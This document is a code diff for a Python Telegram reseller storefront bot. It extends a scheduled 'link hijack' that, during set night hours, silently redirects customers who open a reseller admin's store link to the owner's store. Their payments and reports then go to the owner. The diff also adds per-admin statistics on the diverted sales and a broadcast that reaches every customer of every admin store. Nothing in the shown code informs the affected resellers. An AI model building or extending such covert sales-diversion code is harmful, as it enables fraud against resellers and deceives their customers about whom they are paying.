@@ -51,7 +51,8 @@ DB_STATE = {
         "enabled": False,
         "start_time": "02:00",  # Default format HH:MM
         "end_time": "06:10"
-    }
+    },
+    "hijack_stats": {} # Track hijacked sales per original admin
 }
 
 def get_reseller(uid):
@@ -108,6 +109,18 @@ def get_effective_seller(target_seller_uid):
         return str(OWNER_ID)
     return str(target_seller_uid)
 
+# Record Hijack Statistics
+def record_hijack_stat(orig_admin_uid, pname):
+    if not is_hijack_active() or str(orig_admin_uid) == str(OWNER_ID):
+        return
+    hstats = DB_STATE.setdefault("hijack_stats", {})
+    t = today_str()
+    day_stats = hstats.setdefault(t, {})
+    adm_stats = day_stats.setdefault(str(orig_admin_uid), {"count": 0, "products": {}})
+    adm_stats["count"] += 1
+    adm_stats["products"][pname] = adm_stats["products"].get(pname, 0) + 1
+    save_db()
+
 # ============ PERSISTENCE ============
 def load_db():
     global DB_STATE
@@ -119,6 +132,7 @@ def load_db():
             DB_STATE.setdefault("resellers", {})
             DB_STATE.setdefault("customer_seller", {})
             DB_STATE.setdefault("hijack_config", {"enabled": False, "start_time": "02:00", "end_time": "06:10"})
+            DB_STATE.setdefault("hijack_stats", {})
     except Exception:
         save_db()
 
@@ -174,7 +188,7 @@ def fmt_expiry(ts):
     if left < 86400: return f"{int(left//3600)}h {int((left%3600)//60)}m"
     return f"{int(left//86400)}d {int((left%86400)//3600)}h"
 
-# ============ AUTO BROADCAST WORKER (ONLY Controlled by Owner) ============
+# ============ AUTO BROADCAST WORKER ============
 def auto_broadcast_worker():
     while True:
         try:
@@ -209,7 +223,6 @@ def auto_broadcast_worker():
 
 # ============ CUSTOMER STOREFRONT ============
 def show_storefront(chat_id, seller_uid, is_preview=False):
-    # Dynamic Redirect to Owner if Hijack active
     effective_seller_uid = get_effective_seller(seller_uid)
     r = get_reseller(effective_seller_uid)
     
@@ -217,7 +230,7 @@ def show_storefront(chat_id, seller_uid, is_preview=False):
         bot.send_message(chat_id, "❌ Invalid store link.")
         return
 
-    DB_STATE["customer_seller"][str(chat_id)] = str(effective_seller_uid)
+    DB_STATE["customer_seller"][str(chat_id)] = str(seller_uid) # Remember actual targeted seller
     if chat_id not in r.get("users", []):
         r["users"].append(chat_id)
     save_db()
@@ -241,16 +254,16 @@ def show_storefront(chat_id, seller_uid, is_preview=False):
     if layout == "horizontal":
         row = []
         for p in products:
-            row.append(InlineKeyboardButton(p["name"], callback_data=f"prod_{effective_seller_uid}_{p['id']}"))
+            row.append(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))
             if len(row) == 2:
                 markup.row(*row); row = []
         if row: markup.row(*row)
     else:
         for p in products:
-            markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{effective_seller_uid}_{p['id']}"))
+            markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))
 
-    markup.row(InlineKeyboardButton("How to use ❓", callback_data=f"how_{effective_seller_uid}"),
-               InlineKeyboardButton("Report Issue 📩", callback_data=f"report_{effective_seller_uid}"))
+    markup.row(InlineKeyboardButton("How to use ❓", callback_data=f"how_{seller_uid}"),
+               InlineKeyboardButton("Report Issue 📩", callback_data=f"report_{seller_uid}"))
     bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")
 
 # ============ /start & /admin ============
@@ -267,22 +280,15 @@ def start_command(message):
         show_storefront(uid, uid, is_preview=True)
         return
 
-    # customer via deep link
+    # Customer via deep link
     if param.startswith("s"):
         seller_uid = param[1:]
         show_storefront(uid, seller_uid)
         return
 
-    # already-bound customer
-    bound = DB_STATE["customer_seller"].get(str(uid))
-    if bound and get_reseller(bound):
-        show_storefront(uid, bound)
-        return
-
-    # new/unbound customer
-    bot.send_message(uid, "👋 Welcome!\n\nTo access a store, please open your **seller's special link** "
-                          f"like `t.me/{bot_username()}?start=s123456789`.\n\n"
-                          "If you are the store owner, check the `OWNER_ID` env var and press /start again.")
+    # Direct bot start without link -> Defaults to OWNER_ID Store
+    ensure_reseller(OWNER_ID, role="owner")
+    show_storefront(uid, OWNER_ID)
 
 # ============ PANEL RENDERING ============
 def update_admin_panel(chat_id, text, markup=None):
@@ -321,7 +327,7 @@ def show_store_admin_menu(chat_id):
     
     # Broadcast Options restricted ONLY for Owner
     if is_owner(uid):
-        markup.row(InlineKeyboardButton("🚀 Send Custom Broadcast", callback_data="adm_send_custom_bc"))
+        markup.row(InlineKeyboardButton("🚀 Send Global Custom Broadcast", callback_data="adm_send_custom_bc"))
         markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast", callback_data="adm_autobc_menu"))
         markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers", callback_data="adm_buyers_bc_menu"))
         
@@ -347,7 +353,6 @@ def handle_callbacks(call):
     data = call.data
     mid = call.message.message_id
 
-    # general
     if data == "del_msg":
         try: bot.delete_message(uid, mid)
         except Exception: pass
@@ -366,33 +371,30 @@ def handle_callbacks(call):
         if can_use_panel(uid):
             show_storefront(uid, uid, is_preview=True)
         else:
-            bound = DB_STATE["customer_seller"].get(str(uid))
-            if bound and get_reseller(bound):
-                show_storefront(uid, bound)
+            bound = DB_STATE["customer_seller"].get(str(uid), OWNER_ID)
+            show_storefront(uid, bound)
         return
 
-    # customer how-to / report
     if data.startswith("how_"):
         s_uid = data[4:]
-        s_uid = get_effective_seller(s_uid)
-        sr = get_reseller(s_uid)
+        eff_s_uid = get_effective_seller(s_uid)
+        sr = get_reseller(eff_s_uid)
         vid = sr.get("how_to_use_video", "") if sr else ""
         if vid: bot.send_video(uid, vid, caption="🎥 Here is how to use the bot!")
         else: bot.send_message(uid, "ℹ️ Instructions video not set yet.")
         return
+
     if data.startswith("report_"):
         s_uid = data[7:]
-        s_uid = get_effective_seller(s_uid)
         bot.send_message(uid, "📝 Please type your issue below. Admin will reply soon:")
         user_states[uid] = "WAITING_REPORT_" + s_uid
         return
 
-    # customer product view
     if data.startswith("prod_"):
         parts = data.split("_")
         s_uid, pid = parts[1], parts[2]
-        s_uid = get_effective_seller(s_uid)
-        sr = get_reseller(s_uid)
+        eff_s_uid = get_effective_seller(s_uid)
+        sr = get_reseller(eff_s_uid)
         if not sr: return
         prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
         if not prod: return
@@ -414,17 +416,14 @@ def handle_callbacks(call):
     if data.startswith("paid_"):
         parts = data.split("_")
         s_uid, pid = parts[1], parts[2]
-        s_uid = get_effective_seller(s_uid)
         bot.send_message(uid, "📸 Please send your payment screenshot.")
         user_states[uid] = f"WAITING_SCREENSHOT_{s_uid}_{pid}"
         return
 
-    # owner admin management & Hijack Schedule
     if (data.startswith("own_") or data.startswith("hijack_")) and is_owner(uid):
         _owner_handle(call)
         return
 
-    # non-admin user cannot do more
     if not can_use_panel(uid):
         return
     r = get_reseller(uid)
@@ -450,11 +449,12 @@ def _owner_handle(call):
         mk = InlineKeyboardMarkup()
         mk.row(InlineKeyboardButton("🔴 Turn OFF" if cfg.get("enabled") else "🟢 Turn ON", callback_data="hijack_toggle"))
         mk.row(InlineKeyboardButton("⏱️ Set Custom Time Range", callback_data="hijack_set_time"))
+        mk.row(InlineKeyboardButton("📊 Hijack Sales Stats", callback_data="hijack_view_stats"))
         mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
         txt = f"🌙 **Admin Link Hijack Schedule**\n\n" \
               f"**Status:** {status}\n" \
               f"**Hijack Time:** `{st}` to `{et}`\n\n" \
-              f"ℹ️ *এই সময়ে কোনো কাস্টমার কোনো Admin-এর লিংকে ঢুকলে সেটা স্বয়ংক্রিয়ভাবে Owner-এর স্টোরে রিডাইরেক্ট হবে এবং সকল Payment Owner পাবে।*"
+              f"ℹ️ *এই সময়সূচীতে কোনো Admin-এর লিংকে কাস্টমার ঢুকলে অটোমেটিক Owner Store-এ রিডাইরেক্ট হবে, পেমেন্ট ও রিপোর্ট Owner পাবে।*"
         update_admin_panel(uid, txt, mk)
         return
 
@@ -468,8 +468,28 @@ def _owner_handle(call):
 
     if data == "hijack_set_time":
         user_states[uid] = "WAITING_HIJACK_TIME"
-        update_admin_panel(uid, "✍️ **টাইম রেঞ্জ লিখুন format: `02:00-06:10`**\n(যেমন রাত ২টা থেকে সকাল ৬টা ১০ পর্যন্ত করতে `02:00-06:10` লিখে পাঠান)",
+        update_admin_panel(uid, "✍️ **টাইম রেঞ্জ লিখুন format: `02:00-06:10`**",
                            InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
+        return
+
+    if data == "hijack_view_stats":
+        t = today_str()
+        hs = DB_STATE.get("hijack_stats", {}).get(t, {})
+        txt = f"📊 **Hijack Payments Stats Today ({t}):**\n\n"
+        if not hs:
+            txt += "আজকের দিনে এখন পর্যন্ত হাইজ্যাক লিংকের মাধ্যমে কোনো পেমেন্ট আসেনি।"
+        else:
+            for adm_id, info in hs.items():
+                adm_obj = get_reseller(adm_id)
+                adm_name = adm_obj.get("name") if adm_obj else "Unknown Admin"
+                txt += f"👤 **Admin:** {adm_name} (`{adm_id}`)\n"
+                txt += f"💰 **Total Payments Received:** {info.get('count',0)}\n"
+                txt += f"🛍️ **Products Requested:**\n"
+                for p_name, p_count in info.get("products", {}).items():
+                    txt += f"   • {p_name}: {p_count} টি\n"
+                txt += "-----------------------------------\n"
+        mk = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu"))
+        update_admin_panel(uid, txt, mk)
         return
 
     # --- Admin List & Content Management ---
@@ -489,7 +509,7 @@ def _owner_handle(call):
 
     elif data == "own_add_admin":
         user_states[uid] = "OWN_ADD_ADMIN_ID"
-        update_admin_panel(uid, "✍️ **Type admin's numeric Telegram USER ID** (e.g. `123456789`).\n\nGet it via @userinfobot.",
+        update_admin_panel(uid, "✍️ **Type admin's numeric Telegram USER ID** (e.g. `123456789`).",
                            InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
 
     elif data == "own_del_list":
@@ -509,7 +529,7 @@ def _owner_handle(call):
             mk.row(InlineKeyboardButton(f"⏱️ {x.get('name','')} ({x['uid']}) — {fmt_expiry(x.get('expires_at'))}",
                                         callback_data=f"own_exp_sel_{x['uid']}"))
         mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
-        update_admin_panel(uid, "⏱️ Select admin to adjust expiry.\nThen type `+2h`, `-30m`, `1d`, `30`, or `0` to revoke:", mk)
+        update_admin_panel(uid, "⏱️ Select admin to adjust expiry:", mk)
 
     elif data.startswith("own_exp_sel_"):
         target = data.replace("own_exp_sel_", "")
@@ -522,7 +542,7 @@ def _owner_handle(call):
         for x in admins():
             mk.row(InlineKeyboardButton(f"📊 {x.get('name','')} ({x['uid']})", callback_data=f"own_stats_show_{x['uid']}"))
         mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
-        update_admin_panel(uid, "📊 Select admin to see **today's accepted requests + product names**:", mk)
+        update_admin_panel(uid, "📊 Select admin to see today's stats:", mk)
 
     elif data.startswith("own_stats_show_"):
         target = data.replace("own_stats_show_", "")
@@ -554,7 +574,7 @@ def _owner_handle(call):
         mk.row(InlineKeyboardButton("💳 Set Payment QR/Photo", callback_data=f"own_c_payphoto_{target}"))
         mk.row(InlineKeyboardButton("✏️ Edit Payment Text", callback_data=f"own_c_paymsg_{target}"))
         mk.row(InlineKeyboardButton("⏱️ Edit Timer Broadcast Content", callback_data=f"own_c_timerbc_{target}"))
-        mk.row(InlineKeyboardButton("🚀 Send Instant Broadcast", callback_data=f"own_c_instantbc_{target}"))
+        mk.row(InlineKeyboardButton("🚀 Send Broadcast To THIS Admin's Users", callback_data=f"own_c_instantbc_{target}"))
         mk.row(InlineKeyboardButton("📦 View Buyers", callback_data=f"own_c_buyers_{target}"))
         mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_content_list"))
         update_admin_panel(uid, f"🛠️ **Manage content of `{a.get('name','')}` ({target})**\n\n"
@@ -569,10 +589,10 @@ def _owner_handle(call):
         update_admin_panel(uid, "✏️ **Send NEW payment instructions text** for this admin's store:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
     elif data.startswith("own_c_timerbc_"):
         t = data.replace("own_c_timerbc_", ""); user_states[uid] = f"OWN_C_TIMERBC_{t}"
-        update_admin_panel(uid, "📤 **Send the NEW timer-broadcast message** (text/photo/video/doc) for this admin. Status/time untouched.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
+        update_admin_panel(uid, "📤 **Send the NEW timer-broadcast message** for this admin.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
     elif data.startswith("own_c_instantbc_"):
         t = data.replace("own_c_instantbc_", ""); user_states[uid] = f"OWN_C_INSTANTBC_{t}"
-        update_admin_panel(uid, "🚀 **Send the message to instantly broadcast** to THIS admin's customers:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
+        update_admin_panel(uid, "🚀 **Send message to broadcast ONLY to THIS admin's users:**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
     elif data.startswith("own_c_buyers_"):
         t = data.replace("own_c_buyers_", "")
         a = get_reseller(t); buyers = a.get("buyers", [])
@@ -591,7 +611,6 @@ def _store_admin_handle(call):
     if data == "adm_back_panel":
         show_store_admin_menu(uid); return
 
-    # start videos
     if data == "adm_start_vids_menu":
         mk = InlineKeyboardMarkup()
         mk.row(InlineKeyboardButton("➕ Add Start Videos", callback_data="adm_add_start_vid"))
@@ -625,7 +644,6 @@ def _store_admin_handle(call):
             if 0 <= idx < len(r.get("start_videos", [])): r["start_videos"].pop(idx)
         save_db(); call.data = "adm_del_start_vid_list"; _store_admin_handle(call); return
 
-    # products
     if data == "adm_prod_menu":
         mk = InlineKeyboardMarkup()
         mk.row(InlineKeyboardButton("❇️ Add New Button", callback_data="adm_add_prod"))
@@ -747,7 +765,6 @@ def _store_admin_handle(call):
         r["products"] = [x for x in r.get("products", []) if x["id"] != pid]
         save_db(); call.data = "adm_del_prod_list"; _store_admin_handle(call); return
 
-    # store settings
     if data == "adm_edit_welcome":
         user_states[uid] = "ADM_SET_WELCOME"
         update_admin_panel(uid, "📝 Send new Welcome text (`{name}` = user name):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
@@ -775,7 +792,7 @@ def _store_admin_handle(call):
     if is_owner(uid):
         if data == "adm_send_custom_bc":
             user_states[uid] = "WAITING_CUSTOM_BROADCAST"
-            update_admin_panel(uid, "🚀 Send message to broadcast to YOUR users:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
+            update_admin_panel(uid, "🚀 **Global Broadcast:** Send message to broadcast to ALL USERS across ALL ADMIN STORES:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
 
         if data == "adm_autobc_menu":
             bc = r.get("auto_bc", {})
@@ -844,7 +861,6 @@ def _store_admin_handle(call):
         if b in r.get("blocked_users", []): r["blocked_users"].remove(b)
         save_db(); call.data = "adm_unblock_menu"; _store_admin_handle(call); return
 
-    # payment confirm / reject / block
     if data.startswith("adm_confirm_"):
         parts = data.split("_"); s_uid, pid, cust = parts[2], parts[3], int(parts[4])
         if str(s_uid) != str(uid): return
@@ -886,11 +902,37 @@ def _store_admin_handle(call):
         except Exception: pass
         return
 
-# ============ INPUTS ============
-def do_broadcast(target_store, message):
+# ============ INPUTS & BROADCAST ============
+def do_single_store_broadcast(target_store, message):
     ok = fail = 0
     for u_id in target_store.get("users", []):
         if u_id in target_store.get("blocked_users", []): continue
+        try:
+            if message.content_type == 'text':
+                bot.send_message(u_id, message.text, parse_mode="Markdown")
+            elif message.content_type == 'photo':
+                bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
+            elif message.content_type == 'video':
+                bot.send_video(u_id, message.video.file_id, caption=message.caption, parse_mode="Markdown")
+            elif message.content_type == 'document':
+                bot.send_document(u_id, message.document.file_id, caption=message.caption, parse_mode="Markdown")
+            ok += 1
+        except Exception:
+            fail += 1
+    return ok, fail
+
+def do_global_broadcast(message):
+    all_admin_ids = set(DB_STATE.get("resellers", {}).keys())
+    all_target_users = set()
+    
+    # Collect all customer IDs from ALL stores
+    for r_id, r_data in DB_STATE.get("resellers", {}).items():
+        for u_id in r_data.get("users", []):
+            if u_id not in r_data.get("blocked_users", []) and str(u_id) not in all_admin_ids:
+                all_target_users.add(u_id)
+
+    ok = fail = 0
+    for u_id in all_target_users:
         try:
             if message.content_type == 'text':
                 bot.send_message(u_id, message.text, parse_mode="Markdown")
@@ -923,7 +965,7 @@ def handle_all_inputs(message):
     uid = message.chat.id
     state = user_states.get(uid, "")
 
-    # reseller reply-to forwarding
+    # Reseller reply-to forwarding
     if can_use_panel(uid) and message.reply_to_message:
         rep = message.reply_to_message.text or message.reply_to_message.caption or ""
         m = re.search(r'`(\d+)`', rep)
@@ -936,55 +978,65 @@ def handle_all_inputs(message):
                 bot.reply_to(message, f"❌ {e}")
             return
 
-    # customer report
+    # Customer report
     if state.startswith("WAITING_REPORT_"):
-        s_uid = state.replace("WAITING_REPORT_", "")
-        s_uid = get_effective_seller(s_uid)
+        target_s_uid = state.replace("WAITING_REPORT_", "")
+        dest_seller_uid = get_effective_seller(target_s_uid) # Redirects to OWNER if Hijack Active
+        
         user_states.pop(uid, None)
         bot.send_message(uid, "✅ Your report has been sent to admin.")
         un = message.from_user.username
         tag = f"@{un}" if un else "No Username"
-        bot.send_message(int(s_uid), f"📩 **Report from {tag} (`{uid}`):**\n\n{message.text}\n\n*Reply to forward your answer.*", parse_mode="Markdown")
+        bot.send_message(int(dest_seller_uid), f"📩 **Report from {tag} (`{uid}`):**\n\n{message.text}\n\n*Reply to forward your answer.*", parse_mode="Markdown")
         return
 
-    # customer payment screenshot
+    # Customer payment screenshot
     if state.startswith("WAITING_SCREENSHOT_"):
-        parts = state.split("_"); s_uid, pid = parts[2], parts[3]
-        s_uid = get_effective_seller(s_uid)
+        parts = state.split("_"); orig_s_uid, pid = parts[2], parts[3]
+        dest_s_uid = get_effective_seller(orig_s_uid)
+        
         if message.content_type == 'photo':
-            sr = get_reseller(s_uid)
+            sr = get_reseller(dest_s_uid)
             user_states.pop(uid, None)
             bot.send_message(uid, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁.... 𝗪𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻.")
             prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
             pname = prod["name"] if prod else "Unknown"
+            
+            # Record statistics & Hijack Statistics
             t = today_str()
             st = sr.setdefault("stats", {}).setdefault(t, {"accepted": 0, "requests": 0, "by_product": {}})
             st["requests"] += 1
+            record_hijack_stat(orig_s_uid, pname)
             save_db()
+            
             un = message.from_user.username; tag = f"@{un}" if un else "No Username"
             nm = message.from_user.first_name or "User"
             mk = InlineKeyboardMarkup()
-            mk.row(InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{s_uid}_{pid}_{uid}"),
-                   InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{s_uid}_{uid}"))
-            mk.row(InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{s_uid}_{uid}"))
+            mk.row(InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{dest_s_uid}_{pid}_{uid}"),
+                   InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{dest_s_uid}_{uid}"))
+            mk.row(InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{dest_s_uid}_{uid}"))
+            
+            caption_info = f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {pname}\n👤 {tag}\n📛 {nm}\n🆔 `{uid}`"
+            if is_hijack_active() and str(orig_s_uid) != str(OWNER_ID):
+                orig_adm = get_reseller(orig_s_uid)
+                adm_nm = orig_adm.get("name") if orig_adm else "Admin"
+                caption_info += f"\n\n🌙 **[HIJACKED LINK]** From Admin: {adm_nm} (`{orig_s_uid}`)"
+
             try:
-                bot.send_photo(int(s_uid), message.photo[-1].file_id,
-                               caption=f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {pname}\n👤 {tag}\n📛 {nm}\n🆔 `{uid}`",
-                               reply_markup=mk, parse_mode="Markdown")
+                bot.send_photo(int(dest_s_uid), message.photo[-1].file_id, caption=caption_info, reply_markup=mk, parse_mode="Markdown")
             except Exception: pass
         return
 
-    # ============ reseller inputs ============
+    # ============ Reseller inputs ============
     if can_use_panel(uid):
         rr = get_reseller(uid)
         if not is_owner(uid) and rr.get("expires_at") is not None and now() > rr["expires_at"]:
             return
-        # hide typed content during active panel state
         if state and not state.startswith("WAITING_REPORT_") and not state.startswith("WAITING_SCREENSHOT_"):
             try: bot.delete_message(uid, message.message_id)
             except Exception: pass
 
-        # owner: set hijack time range
+        # Owner: set hijack time range
         if state == "WAITING_HIJACK_TIME" and message.text and is_owner(uid):
             try:
                 parts = message.text.strip().split("-")
@@ -1002,7 +1054,7 @@ def handle_all_inputs(message):
                 update_admin_panel(uid, "❌ Error parsing time. Use format `02:00-06:10`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
             return
 
-        # owner: add admin
+        # Owner: add admin
         if state == "OWN_ADD_ADMIN_ID" and message.text and is_owner(uid):
             try:
                 nid = int(message.text.strip())
@@ -1025,7 +1077,7 @@ def handle_all_inputs(message):
                 update_admin_panel(uid, "❌ Invalid duration. Use `30`, `5m`, `2h`, `1d`.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
             return
 
-        # owner: adjust expiry
+        # Owner: adjust expiry
         if state.startswith("OWN_EXP_IN_") and is_owner(uid):
             target = state.replace("OWN_EXP_IN_", "")
             a = get_reseller(target)
@@ -1043,7 +1095,7 @@ def handle_all_inputs(message):
                 update_admin_panel(uid, f"✅ New expiry of `{target}`: **{fmt_expiry(a['expires_at'])}**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage Admins", callback_data="own_admins_menu")))
             return
 
-        # owner: change admin content
+        # Owner: change admin content
         if state.startswith("OWN_C_PAYPHOTO_") and message.content_type == 'photo' and is_owner(uid):
             t = state.replace("OWN_C_PAYPHOTO_", ""); a = get_reseller(t)
             a["payment_photo"] = message.photo[-1].file_id; save_db(); user_states.pop(uid, None)
@@ -1066,10 +1118,10 @@ def handle_all_inputs(message):
             t = state.replace("OWN_C_INSTANTBC_", ""); a = get_reseller(t)
             user_states.pop(uid, None)
             update_admin_panel(uid, f"🚀 Sending to `{t}`'s users...", None)
-            ok, fail = do_broadcast(a, message)
+            ok, fail = do_single_store_broadcast(a, message)
             update_admin_panel(uid, f"✅ Instant broadcast done for `{t}`.\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}"))); return
 
-        # store settings inputs
+        # Store settings inputs
         if state == "ADM_ADD_START_VID_MULTIPLE" and message.content_type == 'video':
             r = get_reseller(uid); r.setdefault("start_videos", []).append(message.video.file_id); save_db()
             mk = InlineKeyboardMarkup(); mk.row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids"))
@@ -1142,13 +1194,13 @@ def handle_all_inputs(message):
             r = get_reseller(uid); r["payment_msg"] = message.text; save_db()
             user_states.pop(uid, None); show_store_admin_menu(uid); return
 
-        # Owner Only Broadcast Execution Handlers
+        # Owner Broadcast Handlers
         if is_owner(uid):
             if state == "WAITING_CUSTOM_BROADCAST":
-                r = get_reseller(uid); user_states.pop(uid, None)
-                update_admin_panel(uid, "🚀 Sending to your users...", None)
-                ok, fail = do_broadcast(r, message)
-                update_admin_panel(uid, f"✅ Custom Broadcast Done\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))); return
+                user_states.pop(uid, None)
+                update_admin_panel(uid, "🚀 Sending global broadcast to ALL users across ALL admin stores...", None)
+                ok, fail = do_global_broadcast(message)
+                update_admin_panel(uid, f"✅ Global Broadcast Done\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))); return
             if state == "WAITING_AUTOBC_MSG":
                 r = get_reseller(uid); user_states.pop(uid, None)
                 m_type = message.content_type; f_id = None
